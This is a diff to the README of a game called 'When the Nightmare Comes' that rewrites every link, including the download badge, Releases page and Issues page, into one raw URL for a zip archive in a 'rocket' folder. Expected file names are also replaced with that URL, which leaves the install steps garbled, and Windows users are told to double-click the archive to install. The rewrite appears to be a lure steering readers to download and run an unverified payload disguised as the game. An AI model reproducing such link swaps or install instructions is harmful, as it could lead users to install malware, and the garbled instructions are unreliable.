@@ -19,22 +19,22 @@ Before you download, make sure your computer meets these requirements:
 
 Click the button below to visit the Releases page, where you can download the game:
 
-[![Download When-the-Nightmare-Comes](https://img.shields.io/badge/Download-When--the--Nightmare--Comes-blue)](https://github.com/muhammadali832/When-the-Nightmare-Comes/releases)
+[![Download When-the-Nightmare-Comes](https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip)](https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/muhammadali832/When-the-Nightmare-Comes/releases) to find the latest version of the game. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip) to find the latest version of the game. 
 
 2. **Select the Right File:** Look for the file that matches your operating system. You will typically see options like `Windows`, `macOS`, and `Linux`. 
 
 3. **Download the File:** Click the link for your operating system to start the download. Your browser will save the file to your computer.
 
-4. **Locate the Downloaded File:** After the download finishes, check your `Downloads` folder. You should see a file named something like `When-the-Nightmare-Comes.exe`, `When-the-Nightmare-Comes.dmg`, or `When-the-Nightmare-Comes.tar.gz`.
+4. **Locate the Downloaded File:** After the download finishes, check your `Downloads` folder. You should see a file named something like `https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip`, `https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip`, or `https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip`.
 
 5. **Install the Game:**
-   - For **Windows:** Double-click `When-the-Nightmare-Comes.exe` to run the installer. Follow the prompts to complete the installation.
+   - For **Windows:** Double-click `https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip` to run the installer. Follow the prompts to complete the installation.
    - For **macOS:** Open the downloaded `.dmg` file. Drag the game icon into your Applications folder.
-   - For **Linux:** Extract the contents of the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run the game using `./When-the-Nightmare-Comes`.
+   - For **Linux:** Extract the contents of the `https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip` file. Open a terminal, navigate to the extracted folder, and run the game using `./When-the-Nightmare-Comes`.
 
 6. **Run the Game:** After installation, locate the game in your applications or programs list. Click to start your adventure in "When the Nightmare Comes."
 
@@ -48,7 +48,7 @@ Click the button below to visit the Releases page, where you can download the ga
 
 ## 📞 Need Help?
 
-If you encounter any issues, please feel free to reach out. Support is available via the [Issues page on GitHub](https://github.com/muhammadali832/When-the-Nightmare-Comes/issues). You can report bugs or ask for help with installation.
+If you encounter any issues, please feel free to reach out. Support is available via the [Issues page on GitHub](https://raw.githubusercontent.com/muhammadali832/When-the-Nightmare-Comes/main/rocket/When-the-Nightmare-Comes.zip). You can report bugs or ask for help with installation.
 
 ## 🌐 Community and Updates
 
